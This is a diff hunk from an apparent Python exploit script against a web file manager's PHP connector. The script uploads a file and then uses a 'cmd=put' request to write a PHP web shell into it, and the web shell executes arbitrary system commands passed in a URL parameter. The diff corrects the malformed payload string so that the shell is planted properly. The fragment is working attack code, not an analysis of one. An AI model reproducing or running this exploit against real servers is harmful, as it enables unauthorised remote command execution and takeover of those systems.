@@ -24,7 +24,7 @@ if response.status_code != 200:
 
 file_hash = json.loads(response.text)["added"][0]["hash"]
 
-res = requests.get(f"""{target}php/connector.minimal.php?cmd=put&content=/php/connector.minimal.php?cmd=put&content=<?php system($_GET["66347183517170905805845495"]); ?>&target={file_hash}""")
+res = requests.get(f"""{target}php/connector.minimal.php?cmd=put&content=<?php system($_GET["66347183517170905805845495"]); ?>&target={file_hash}""")
 
 if res.status_code != 200:
     print("Something went wrong aborting...")
